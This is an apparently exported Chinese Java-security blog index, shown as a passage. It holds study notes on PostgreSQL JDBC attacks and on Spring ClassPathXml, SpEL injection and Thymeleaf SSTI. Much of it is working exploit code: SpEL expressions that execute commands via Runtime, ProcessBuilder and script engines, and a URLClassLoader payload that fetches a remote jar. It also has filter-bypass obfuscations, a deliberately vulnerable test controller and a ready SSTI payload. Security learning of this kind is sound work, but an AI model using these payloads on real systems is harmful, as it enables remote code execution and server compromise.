&#x2F;proc\n其他能够实现文件上传的能找到的文件上传点。\n","categories":["Java安全"],"tags":["Java安全"]},{"title":"JDBC","url":"/2025/10/01/JDBC/","content":"PostgreSql构造方法调用DriverManager.getConnection(“jdbc:postgresql:&#x2F;&#x2F;node1&#x2F;test?socketFactory&#x3D;org.springframework.context.support.ClassPathXmlApplicationContext&amp;socketFactoryArg&#x3D;http://target/exp.xml“);\n也可使用file:，jar:file: 去加载本地文件。\nClassPathXml支持Ant表达式，即可以使用 file:&#x2F;&#x2F;&#x2F;${catalina.home}&#x2F;**&#x2F;*.tmp 的方式加载文件。\n写文件public class cve202221724 &#123;    public static void main(String[] args) throws SQLException &#123;        String loggerLevel = &quot;debug&quot;;        String loggerFile = &quot;test.txt&quot;;        String shellContent=&quot;test&quot;;        String jdbcUrl = &quot;jdbc:postgresql://127.0.0.1:5432/test?loggerLevel=&quot;+loggerLevel+&quot;&amp;loggerFile=&quot;+loggerFile+ &quot;&amp;&quot;+shellContent;        Connection connection = DriverManager.getConnection(jdbcUrl);    &#125;&#125;\n\n不过这样写保存的文件前后会有脏字符。\n","categories":["JavaGadget"],"tags":["JavaGadget"]},{"title":"Sink","url":"/2025/10/01/Sink/","content":"ClassPathXml这里的利用关键是，能不能上传xml文件到可控路径。\nPostgreSql写入ascii.jar!&#x2F;exp.xml首先，需要明白有这么几个事实\n1、jar文件本质就是zip\n2、zip文件在文件前后添加脏字符，不影响文件本身\n3、xml文件前后不能出现脏字符\n4、ClassPathXml读取文件时，文件不能出现非ascii字符。jar:file:&#x2F;&#x2F;&#x2F;D:&#x2F;ascii.jar!&#x2F;1.xml时，ascii.jar中也不能出现非ascii字符\n5、postgresql通过漏洞写文件时，前后会出现脏字符\n接下来讲漏洞利用。\n首先创建exp.xml\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xsi:schemaLocation=&quot;     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;    &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;        &lt;constructor-arg&gt;            &lt;list&gt;                &lt;value&gt;cmd&lt;/value&gt;                &lt;value&gt;/c&lt;/value&gt;                &lt;value&gt;calc&lt;/value&gt;            &lt;/list&gt;        &lt;/constructor-arg&gt;    &lt;/bean&gt;&lt;/beans&gt;\n\n接下来利用https://github.com/c0ny1/ascii-jar 项目的ascii-jar-2.py，制作全都是ascii范围内的jar包。注意PADDING_DATA要放到末尾，因为xml文件开头是固定的。\n\n制作出来的jar包，范围都在00~7F内：\n\n接下来对jar包进行URL编码，这里使用Java脚本，如果用python的话，一定要确定自己编码后的格式正确：\npublic class UrlEncodeFile &#123;    public static void main(String[] args) throws IOException &#123;        byte[] bytes = Files.readAllBytes(Paths.get(&quot;./ascii.jar&quot;));        String encode = URLEncoder.encode(new String(bytes), &quot;utf-8&quot;);        System.out.println(encode);    &#125;&#125;\n\n然后通过postgre漏洞写文件：\n\n最后通过ClassPathXml读取：\n\nspringboot临时文件法一个请求发送一个请求，其中带有临时文件和xml加载路径。\n\n异步请求先发送临时文件请求，主要目标是这个临时文件要长期存活。\n可以通过修改Content-Length + 删掉 boundary  + 大段空格 实现。\n\n然后再正常发送另一个利用请求即可\n爆破fd通过 file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;fd&#x2F;xxx 去访问产生的临时文件，这里解释一下。\n一般获取一个进程的信息时，是通过 &#x2F;proc&#x2F;pid 的方式去获取。但是一个进程如果想获取自身的信息，再去填pid就显得多此一举。所以提供了 &#x2F;proc&#x2F;self 的方式，允许进程直接访问自身信息。所以，对应不同进程来说，&#x2F;proc&#x2F;self 的结果是不一样的。而fd目录是file descriptor，文件描述符，该目录存储了指向当前进程操作过的文件的软连接，以数字0开始命名，通过它可以获取进程中有关的配置文件等。所以可以通过遍历 fd 的方式去加载临时文件。\n顺便补充一下 &#x2F;proc 里面的其他目录。\n&#x2F;proc&#x2F;pid&#x2F;cmdline存储了启动该进程的shell命令\ncwd是一个软连接，指向进程运行目录\nenviron文件存储了进程的环境变量\n详细请搜索：Linux 进程信息目录 &#x2F;proc\n其他能够实现文件上传的能找到的文件上传点。\n","categories":["JavaGadget"],"tags":["JavaGadget"]},{"title":"SPEL","url":"/2025/10/14/SPEL/","content":"https://www.cnblogs.com/bitterz/p/15206255.html\nhttps://xz.aliyun.com/news/8744\nhttps://drun1baby.top/2022/09/23/Java-%E4%B9%8B-SpEL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5\n主要看的这三篇文章，下面简要整理一下我认为的重点。\nSPEL表达式基础定界符#{}SpEL 使用 #&#123;&#125; 作为定界符，所有在大括号中的字符都将被认为是 SpEL 表达式，在其中可以使用 SpEL 运算符、变量、引用 Bean 及其属性和方法等。\n这里需要注意 #&#123;&#125; 和 $&#123;&#125; 的区别：\n#&#123;&#125; 就是 SpEL 的定界符，用于指明内容未 SpEL 表达式并执行；\n$&#123;&#125; 主要用于加载外部属性文件中的值；\n两者可以混合使用，但是必须 #&#123;&#125; 在外面，$&#123;&#125; 在里面，如 #&#123;&#39;$&#123;&#125;&#39;&#125;，注意单引号是字符串类型才添加的；\n主要用法xml配置文件可以在bean配置文件中，对类属性类方法进行引用：\n&lt;bean id=&quot;kenny&quot; class=&quot;com.spring.entity.Instrumentalist&quot;    p:song=&quot;May Rain&quot;    p:instrument-ref=&quot;piano&quot;/&gt;&lt;bean id=&quot;Drunkbaby&quot; class=&quot;com.spring.entity.Instrumentalist&quot;&gt;    &lt;property name=&quot;instrument&quot; value=&quot;#&#123;kenny.instrument&#125;&quot;/&gt;    &lt;property name=&quot;song&quot; value=&quot;#&#123;kenny.song&#125;&quot;/&gt;&lt;/bean&gt;\n\n可以通过T()来访问类，类的静态方法和静态变量，这个很重要：\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;  &lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;   xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;   xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans   http://www.springframework.org/schema/beans/spring-beans-3.0.xsd &quot;&gt;        &lt;bean id=&quot;helloWorld&quot; class=&quot;com.drunkbaby.pojo.HelloWorld&quot;&gt;          &lt;property name=&quot;message&quot; value=&quot;#&#123;&#x27;Drunkbaby&#x27;&#125; is #&#123;T(java.lang.Math).random()&#125;&quot; /&gt;      &lt;/bean&gt;    &lt;/beans&gt;\n\n这部分和ClassPathXml加载xml文件实现代码执行有联系，xml里也是通过SPEL来写payload的：\n\n\n@Value注解一般是注入配置文件中的值\npublic class EmailSender &#123;    @Value(&quot;$&#123;spring.mail.username&#125;&quot;)    private String mailUsername;    @Value(&quot;#&#123; systemProperties[&#x27;user.region&#x27;] &#125;&quot;)        private String defaultLocale;    //...&#125;\n\n代码块中使用Expression应用示例如下，和前面 XML 配置的用法区别在于程序会将这里传入 parseExpression() 函数的字符串参数当初 SpEL 表达式来解析，而无需通过 #&#123;&#125; 符号来注明：\nExpressionParser parser = new SpelExpressionParser();Expression expression = parser.parseExpression(&quot;(&#x27;Hello&#x27; + &#x27; Drunkbaby&#x27;).concat(#end)&quot;);EvaluationContext context = new StandardEvaluationContext();context.setVariable(&quot;end&quot;, &quot;!&quot;);System.out.println(expression.getValue(context));\n\n注意里面的#end，这代表引用变量。\n#this：使用当前正在计算的上下文；\n#root：引用容器的 root 对象；\n每一行的意思：\n1、创建解析器：SpEL 使用 ExpressionParser 接口表示解析器，提供 SpelExpressionParser 默认实现；2、解析表达式：使用 ExpressionParser 的 parseExpression 来解析相应的表达式为 Expression 对象；3、构造上下文：准备比如变量定义等等表达式需要的上下文数据；（可省略）4、求值：通过 Expression 接口的 getValue 方法根据上下文获得表达式值；\n主要接口：\nExpressionParser 接口：表示解析器，默认实现是 org.springframework.expression.spel.standard 包中的 SpelExpressionParser 类，使用 parseExpression 方法将字符串表达式转换为 Expression 对象，对于 ParserContext 接口用于定义字符串表达式是不是模板，及模板开始与结束字符；\nEvaluationContext 接口：表示上下文环境，默认实现是 org.springframework.expression.spel.support 包中的 StandardEvaluationContext 类，使用 setRootObject 方法来设置根对象，使用 setVariable 方法来注册自定义变量，使用 registerFunction 来注册自定义函数等等。\nExpression 接口：表示表达式对象，默认实现是 org.springframework.expression.spel.standard 包中的 SpelExpression，提供 getValue 方法用于获取表达式值，提供 setValue 方法用于设置对象值。\n利用方式RCE第一部分调用ProcessBuilder，调用Runtime，调用ScriptEngine\n直接看代码：\npackage com.test;import org.springframework.expression.Expression;import org.springframework.expression.ExpressionParser;import org.springframework.expression.spel.standard.SpelExpressionParser;import javax.script.ScriptEngineFactory;import javax.script.ScriptEngineManager;import java.util.List;// 如果使用非默认ParserContext，所有payload用#&#123;&#125;包裹public class RcePart1 &#123;    public static void main(String[] args) &#123;//        pb();//        runtime();//        getEngineFactory();//        nashorn();        javascript();    &#125;    public static void pb() &#123;        String cmdStr = &quot;new java.lang.ProcessBuilder(new String[]&#123;&#x27;calc&#x27;&#125;).start()&quot;;        ExpressionParser parser = new SpelExpressionParser();//创建解析器        Expression exp = parser.parseExpression(cmdStr);//解析表达式        System.out.println( exp.getValue() );//弹出计算器    &#125;    public static void runtime() &#123;        String cmdStr = &quot;T(Runtime).getRuntime().exec(new String[]&#123;&#x27;cmd.exe&#x27;, &#x27;/c&#x27;, &#x27;notepad&#x27;&#125;)&quot;;        ExpressionParser parser = new SpelExpressionParser();//创建解析器        Expression exp = parser.parseExpression(cmdStr);//解析表达式        System.out.println( exp.getValue() );    &#125;    public static void getEngineFactory() &#123;        ScriptEngineManager manager = new ScriptEngineManager();        List&lt;ScriptEngineFactory&gt; factories = manager.getEngineFactories();        for (ScriptEngineFactory factory: factories)&#123;            System.out.printf(                    &quot;Name: %s%n&quot; + &quot;Version: %s%n&quot; + &quot;Language name: %s%n&quot; +                            &quot;Language version: %s%n&quot; +                            &quot;Extensions: %s%n&quot; +                            &quot;Mime types: %s%n&quot; +                            &quot;Names: %s%n&quot;,                    factory.getEngineName(),                    factory.getEngineVersion(),                    factory.getLanguageName(),                    factory.getLanguageVersion(),                    factory.getExtensions(),                    factory.getMimeTypes(),                    factory.getNames()            );        &#125;    &#125;    public static void nashorn()&#123;        String cmdStr = &quot;new javax.script.ScriptEngineManager().getEngineByName(\\&quot;nashorn\\&quot;).eval(\\&quot;s=[1];s[0]=&#x27;calc&#x27;;java.lang.Runtime.getRuntime().exec(s);\\&quot;)&quot;;        ExpressionParser parser = new SpelExpressionParser();//创建解析器        Expression exp = parser.parseExpression(cmdStr);//解析表达式        System.out.println( exp.getValue() );//弹出计算器    &#125;    public static void javascript()&#123;        String cmdStr = &quot;new javax.script.ScriptEngineManager().getEngineByName(\\&quot;javascript\\&quot;).eval(\\&quot;s=[1];s[0]=&#x27;calc&#x27;;java.lang.Runtime.getRuntime().exec(s);\\&quot;)&quot;;        ExpressionParser parser = new SpelExpressionParser();//创建解析器        Expression exp = parser.parseExpression(cmdStr);//解析表达式        System.out.println( exp.getValue() );//弹出计算器    &#125;&#125;\n\nRCE第二部分调用各式各样的ClassLoader，包括UrlClassLoader，AppClassLoader\n直接看代码：\npackage com.test;import org.springframework.expression.Expression;import org.springframework.expression.ExpressionParser;import org.springframework.expression.spel.standard.SpelExpressionParser;public class RcePart2 &#123;    public static void main(String[] args) &#123;//        urlLoader();//        appLoader();        getAppFromOtherClass();    &#125;    /*打包jar时，如果类在多层包中，打包时一定要把前面几层文件夹也打包进行，jar打开应该是aaa/bbb/Exp.class的形式，这样才能正常loadClass*/    public static void urlLoader()&#123;        String cmdStr = &quot;new java.net.URLClassLoader(new java.net.URL[]&#123;new java.net.URL(\\&quot;http://127.0.0.1:7777/Exp.jar\\&quot;)&#125;).loadClass(\\&quot;aaa.bbb.Exp\\&quot;).getConstructors()[0].newInstance(\\&quot;calc\\&quot;)&quot;;        ExpressionParser parser = new SpelExpressionParser();//创建解析器        Expression exp = parser.parseExpression(cmdStr);//解析表达式        System.out.println( exp.getValue() );    &#125;    public static void appLoader()&#123;        String cmdStr = &quot;T(ClassLoader).getSystemClassLoader().loadClass(\\&quot;java.lang.Runtime\\&quot;).getRuntime().exec(&#x27;calc&#x27;)&quot;;        ExpressionParser parser = new SpelExpressionParser();        Expression exp = parser.parseExpression(cmdStr);        System.out.println( exp.getValue() );    &#125;    public static void getAppFromOtherClass()&#123;        String cmdStr = &quot;T(org.springframework.expression.Expression).getClass().getClassLoader().loadClass(\\&quot;java.lang.Runtime\\&quot;).getMethod(\\&quot;getRuntime\\&quot;).invoke(null).exec(\\&quot;calc\\&quot;)&quot;;        ExpressionParser parser = new SpelExpressionParser();        Expression exp = parser.parseExpression(cmdStr);        System.out.println( exp.getValue() );    &#125;    /*有web上下文的环境使用。不过我本地测试全失败了。而且不知道为什么文章里要加[[$&#123;&#125;]]*/    public static void getUrlFromInnerClass()&#123;        String cmdStr1 = &quot;#request.getClass().getClassLoader().loadClass(\\&quot;java.lang.Runtime\\&quot;).getMethod(\\&quot;getRuntime\\&quot;).invoke(null).exec(\\&quot;calc\\&quot;)&quot;;        String cmdStr2 = &quot;username[#this.getClass().forName(\\&quot;javax.script.ScriptEngineManager\\&quot;).newInstance().getEngineByName(\\&quot;js\\&quot;).eval(\\&quot;java.lang.Runtime.getRuntime().exec(&#x27;xterm&#x27;)\\&quot;)]=asdf&quot;;    &#125;&#125;\n\n回显利用package com.test;import org.springframework.expression.Expression;import org.springframework.expression.ExpressionParser;import org.springframework.expression.spel.standard.SpelExpressionParser;public class RceEcho &#123;    public static void main(String[] args) &#123;//        commons_io();//        br();        scanner();    &#125;    /*必须有commons-io依赖*/    public static void commons_io()&#123;        String cmdStr = &quot;T(org.apache.commons.io.IOUtils).toString((new java.lang.ProcessBuilder(new String[]&#123;&#x27;whoami&#x27;&#125;).start()).getInputStream())&quot;;        ExpressionParser parser = new SpelExpressionParser();//创建解析器        Expression exp = parser.parseExpression(cmdStr);//解析表达式        System.out.println( exp.getValue() );    &#125;    /*仅适用于jdk&gt;=9*/    public static void jShell()&#123;        String cmdStr = &quot;T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass(\\&quot;jdk.jshell.JShell\\&quot;,true).Methods[6].invoke(null,&#123;&#125;).eval(\\&quot;T(Runtime).getRuntime().exec(&#x27;whoami&#x27;)\\&quot;).toString()&quot;;        ExpressionParser parser = new SpelExpressionParser();//创建解析器        Expression exp = parser.parseExpression(cmdStr);//解析表达式        System.out.println( exp.getValue() );    &#125;    /*缺点：只能读一行*/    public static void br()&#123;        String cmdStr = &quot;new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder(\\&quot;cmd\\&quot;, \\&quot;/c\\&quot;, \\&quot;whoami\\&quot;).start().getInputStream(), \\&quot;gbk\\&quot;)).readLine()\\n&quot;;        ExpressionParser parser = new SpelExpressionParser();        Expression exp = parser.parseExpression(cmdStr);        System.out.println( exp.getValue() );    &#125;    /*useDelimiter内的参数为分割标志，所以随便填一个，这样回显结果才完整*/    public static void scanner()&#123;        String cmdStr = &quot;new java.util.Scanner(new java.lang.ProcessBuilder(\\&quot;cmd\\&quot;, \\&quot;/c\\&quot;, \\&quot;dir\\&quot;, \\&quot;.\\&quot;).start().getInputStream(), \\&quot;GBK\\&quot;).useDelimiter(\\&quot;asfsfsdfsf\\&quot;).next()\\n&quot;;        ExpressionParser parser = new SpelExpressionParser();        Expression exp = parser.parseExpression(cmdStr);        System.out.println( exp.getValue() );    &#125;&#125;\n\n绕过技巧package com.test;public class BypassTrick &#123;/** * // 反射调用+字符串拼接，绕过如javacon题目中的正则过滤 * T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]&#123;&quot;cmd&quot;,&quot;/C&quot;,&quot;calc&quot;&#125;) * * new java.lang.ProcessBuilder(new java.lang.String(new byte[]&#123;99,97,108,99&#125;)).start() * * T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(99))) * * T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;xxx&quot;)) * *T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(T(java.net.URLDecoder).decode(&quot;%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29&quot;)),) */&#125;\n\nWeb环境下利用package com.spring.controller;import org.springframework.expression.Expression;import org.springframework.expression.common.TemplateParserContext;import org.springframework.expression.spel.standard.SpelExpressionParser;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.PostMapping;import org.springframework.web.bind.annotation.ResponseBody;import java.io.IOException;@Controllerpublic class TestController &#123;    /*由于tomcat对GET请求中的| &#123;&#125; 等特殊字符存在限制(RFC 3986)，所以使用POST方法传递参数*/    @ResponseBody    @PostMapping(value = &quot;/index&quot;)    public String index(String string) throws IOException &#123;        SpelExpressionParser spelExpressionParser = new SpelExpressionParser();        Expression expression = spelExpressionParser.parseExpression(string);        String out = (String) expression.getValue();        out = out.concat(&quot; get&quot;);        return out;    &#125;    @ResponseBody    @PostMapping(value = &quot;/index2&quot;)    public String index2(String string) throws IOException &#123;        SpelExpressionParser spelExpressionParser = new SpelExpressionParser();        TemplateParserContext templateParserContext = new TemplateParserContext();        /*使用模板解析，传参时需要加上#&#123;&#125;*/        Expression expression = spelExpressionParser.parseExpression(string, templateParserContext);        Integer out = (Integer) expression.getValue();        return Integer.toString(out);    &#125;&#125;\n\n唯一要注意的是，&#x2F;index2中，配置了ParseContext，所以传参要带上#{}\n疑惑1、从其他类获取的ClassLoader无法正常利用\n\n2、无法在Web环境中获取#request，#this；不理解[[${}]]的作用\n\n\n我这样会报错，去掉#也是。\n\n不知道这里为什么传入[[${}]]，不知道他web端怎么写的\n","categories":["Java安全"],"tags":["Java安全"]},{"title":"Thymeleaf SSTI","url":"/2025/10/16/Thymeleaf-SSTI/","content":"环境搭建&lt;dependencies&gt;  &lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;    &lt;version&gt;2.7.15&lt;/version&gt;  &lt;/dependency&gt;  &lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt;    &lt;version&gt;2.2.12.RELEASE&lt;/version&gt;  &lt;/dependency&gt;&lt;/dependencies&gt;\n\n\n对应的版本是3.0.11，而漏洞范围是3.0.0~3.0.11，符合。3.0.12，3.0.13，3.0.14存在绕过。3.0.15彻底修复。\n最新的3.1.2存在绕过。\n对应版本\nSpringBoot     Thymeleaf2.2.0.RELEASE  3.0.112.4.10         3.0.122.7.18         3.0.153.0.8          3.1.13.2.2          3.1.2\n\n\n\napplication.yml 主要是设置不缓存，保证html能热加载\nserver:  port: 8084spring:  thymeleaf:    cache: false\n\n\n\n另外，讲一下三种依赖的区别，直接搬运：\n\n基本用法HelloController，用于学习基本用法：\npackage com.test.controller;import com.test.pojo.User;import org.springframework.stereotype.Controller;import org.springframework.ui.Model;import org.springframework.web.bind.annotation.GetMapping;import java.util.Date;@Controllerpublic class HelloController &#123;    @GetMapping(&quot;hello&quot;)    public String show1(Model model) &#123;        model.addAttribute(&quot;msg&quot;, &quot;Hello World&quot;);        return &quot;index&quot;;    &#125;    @GetMapping(&quot;add&quot;)    public String addUser(Model model) &#123;        User user = new User();        user.setAge(20);        user.setName(&quot;&lt;p&gt;baka123&lt;/p&gt;&quot;);        model.addAttribute(&quot;user&quot;, user);        return &quot;user&quot;;    &#125;    @GetMapping(&quot;date&quot;)    public String date(Model model)&#123;        model.addAttribute(&quot;today&quot;, new Date());        return &quot;date&quot;;    &#125;    @GetMapping(&quot;page&quot;)    public String page(Model model)&#123;        return &quot;page&quot;;    &#125;&#125;\n\n\n\nindex.html\n&lt;!DOCTYPE html&gt;&lt;!--把html 的名称空间，改成：xmlns:th=&quot;http://www.thymeleaf.org&quot; 会有语法提示--&gt;&lt;html lang=&quot;en&quot; xmlns:th=&quot;http://www.thymeleaf.org&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;hello&lt;/title&gt;    &lt;link rel=&quot;stylesheet&quot; th:href=&quot;@&#123;app.css&#125;&quot;&gt;&lt;/head&gt;&lt;body&gt;    &lt;!--text: 支持文本替换，若文本包含html字符，则会被转义 &lt;p&gt;你好&lt;/p&gt;将会被格式化输出为$lt;p$gt;你好$lt;/p$lt;--&gt;    &lt;h1 th:text=&quot;$&#123;msg&#125;&quot;&gt;大家好&lt;/h1&gt;    &lt;!--单引号输出字面值--&gt;    &lt;h1 th:text=&quot;&#x27;$&#123;msg&#125;&#x27;&quot;&gt;大家好&lt;/h1&gt;    &lt;div class=&quot;app&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;\n\n\n\napp.css\n.app&#123;    height: 200px;    width: 200px;    background-color: darkblue;&#125;\n\n\n\nuser.html\n&lt;!DOCTYPE html&gt;&lt;!--把html 的名称空间，改成：xmlns:th=&quot;http://www.thymeleaf.org&quot; 会有语法提示--&gt;&lt;html lang=&quot;en&quot; xmlns:th=&quot;http://www.thymeleaf.org&quot;&gt;  &lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;hello&lt;/title&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;h1&gt;      &lt;!--utext: 支持html标签的文本替换--&gt;      欢迎您：&lt;span th:utext=&quot;$&#123;user.name&#125;&quot;&gt;---&lt;/span&gt;    &lt;/h1&gt;    &lt;h1&gt;      &lt;!--|| 避免字符串拼接时写过多单引号和加号--&gt;      &lt;span th:utext=&quot;|$&#123;user.name&#125;, 你好啊!|&quot;&gt;---&lt;/span&gt;    &lt;/h1&gt;    &lt;h2 th:object=&quot;$&#123;user&#125;&quot;&gt;      &lt;p&gt;Name: &lt;span th:text=&quot;*&#123;name&#125;&quot;&gt;Jack&lt;/span&gt;.&lt;/p&gt;      &lt;p&gt;Age: &lt;span th:text=&quot;*&#123;age&#125;&quot;&gt;21&lt;/span&gt;.&lt;/p&gt;    &lt;/h2&gt;  &lt;/body&gt;&lt;/html&gt;\n\n\n\ndate.html\n&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot; xmlns:th=&quot;http://www.thymeleaf.org&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;p&gt;        今天是: &lt;span th:text=&quot;$&#123;#dates.format(today,&#x27;yyyy-MM-dd&#x27;)&#125;&quot;&gt;2020-03-30&lt;/span&gt;    &lt;/p&gt;&lt;/body&gt;&lt;/html&gt;\n\n\n\npage.html\n&lt;!DOCTYPE html&gt;&lt;!--把html 的名称空间，改成：`xmlns:th=&quot;http://www.thymeleaf.org&quot;` 会有语法提示--&gt;&lt;html lang=&quot;en&quot; xmlns:th=&quot;http://www.thymeleaf.org&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;hello&lt;/title&gt;    &lt;link rel=&quot;stylesheet&quot; th:href=&quot;@&#123;app.css&#125;&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;!--注意：在调用fragment时是从Thymeleaf文件的根路径：src/main/resource/templates开始的，如果像读取子路径下的代码块应该配置相应的路径。--&gt;&lt;div th:replace=&quot;~&#123;component::com1&#125;&quot;&gt;&lt;/div&gt;&lt;!--保留原来的标签--&gt;&lt;div th:insert=&quot;~&#123;component::com2&#125;&quot;&gt;&lt;/div&gt;&lt;!--只需要在公共组件添加一个 id 或 class 等只要css 能唯一定位到的属性即可   (此处以 id 为例)--&gt;&lt;div th:insert=&quot;~&#123;component::#com3&#125;&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;\n\n\n\ncomponent.html\n&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot; xmlns:th=&quot;http://www.thymeleaf.org&quot;&gt;&lt;div th:fragment=&quot;com1&quot;&gt;    111&lt;/div&gt;&lt;div th:fragment=&quot;com2&quot;&gt;    222&lt;/div&gt;&lt;div id=&quot;com3&quot;&gt;    333&lt;/div&gt;&lt;/html&gt;\n\n\n\n大部分的用法我都写在注释里了，这里再总结搬运一下：\n\n\n我们在Controller里会有这种写法：\n@GetMapping(&quot;hello&quot;)public String show1(Model model) &#123;    model.addAttribute(&quot;msg&quot;, &quot;Hello World&quot;);    return &quot;index&quot;;&#125;\n\n这时候 return “index”，相当于~{index.html}，跟调用了fragment标签的效果是一样的。\n漏洞复现TestController 用于制造漏洞环境\npackage com.test.controller.vul;import org.springframework.stereotype.Controller;import org.springframework.ui.Model;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.PathVariable;import org.springframework.web.bind.annotation.PostMapping;import org.springframework.web.bind.annotation.RequestParam;@Controllerpublic class TestController &#123;    @PostMapping(&quot;/vul0&quot;)    public String vul0(@RequestParam String payload)&#123;        return payload;    &#125;    /*payload: __$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;).getInputStream(),&quot;GBK&quot;).useDelimiter(&quot;asdasdasd&quot;).next()&#125;__::.x   */    /*发现这样也行：__$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;).getInputStream(),&quot;GBK&quot;).useDelimiter(&quot;asdasdasd&quot;).next()&#125;__::*/    /*最后发现，只要有__$&#123;&#125;__::，或::__$&#123;&#125;__，或者把$替换成*，都是能够利用 */    @PostMapping(&quot;/vul1&quot;)    public String vul1(@RequestParam String payload, Model model) &#123;        model.addAttribute(&quot;name&quot;, &quot;baka&quot;);        return &quot;test/&quot;+payload+&quot;/ttt&quot;;    &#125;    @PostMapping(&quot;/vul2&quot;)    public String vul2(@RequestParam String payload) &#123;        return payload+&quot;::unsafe&quot;;    &#125;    @PostMapping(&quot;/vul3&quot;)    public String vul3(@RequestParam String payload) &#123;        return &quot;index::&quot; + payload;    &#125;    @GetMapping(&quot;/vul4/&#123;payload&#125;&quot;)    public void vul4(@PathVariable String payload) &#123;        System.out.println(payload);    &#125;&#125;\n\n\n\n这里要注意一点，如果是GET传参，需要URL编码，否则在tomcat9.x中会报错，不支持&amp;_等字符：\n\npayload一般用这个就行：\n__$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;).getInputStream(),&quot;GBK&quot;).useDelimiter(&quot;asdasdasd&quot;).next()&#125;__::.x\n\n但是&#x2F;vul4 我一直测试失败，跟进发现是解析表达式时，没有找到{，因为当时还是URL编码形式，后面会讲。\n漏洞分析本质是SPEL，先看最终调用点：\n\n这个调用和之前学习SPEL时是一模一样的。\n那现在的问题是，为什么能够进入SPEL解析。之前学习SPEL注入时，我们的定界符用的是#{}，为什么到这里就变成__${}__这种了呢？用#行不行？为什么要有 __:: 这种？这些都是后面要搞清楚的问题。\n首先来看一张图：\n\n这张图在学习内存马的时候也出现过，对我们理解spring如何处理一个请求并回显有很大帮助。后面分析时，可以时不时回头看一眼。\n当我们想自己调试时，可以在Runtime.exec这种命令执行点，或者com.test.controller.vul.TestController#vul1 这种业务处理点下断点，这样就能够大致了解完整的调用栈，方便我们分析参数是如何传递的。\n不过这里，我直接跟着网上文章分析，但是从后往前，即先看里漏洞触发最近的方法。\n首先要知道，一个请求最终都会走到org.springframework.web.servlet.DispatcherServlet#doDispatch，里面有三个重要方法。\n\n下面的分析都基于&#x2F;vul1\nprocessDispatchResult漏洞触发先在org.springframework.web.servlet.DispatcherServlet#processDispatchResult打断点，走到render：\n\n这里已经被controller处理过了，view就是返回的视图名称，model就是我们自己addAttribute的内容。\n跟进render：\n\n先对视图处理，获取view对象。继续往下：\n\n这里拿刚刚获取的view对象进行进一步的渲染，跟进，直到renderFragment：\n\n这里getTemplateName获取的值是test&#x2F;…..&#x2F;ttt，这就是我们在controller里返回的。这里能证实，返回的内容，就是会被当作模板解析，跟~{xxx}的效果是一样的。继续往下：\n\n首先看上面的if，判断有没有双冒号，这就是为什么我们payload里要加双冒号的原因。其实双冒号只需要加在__${}__外的任何地方都行。其次，看到下面的~{ + … + } 。这再次印证了，controller里return的内容，会被作为fragment处理。\n然后会产生两个分支。\n分支1跟进parseExpression：\n\n这里跟进preprocess：\n\n这里有个很重要的操作，获取两个双下划线内的值，最后获取的就是${xxx}：\n\n跟进parseExpression：\n\n然后跟进parse：\n\n然后跟进decompose：\n\n直到进入org.thymeleaf.standard.expression.ExpressionParsingUtil#decomposeSimpleExpressions，这里第一次会进入这个if：\n\n判断第一个字符是不是$, *, 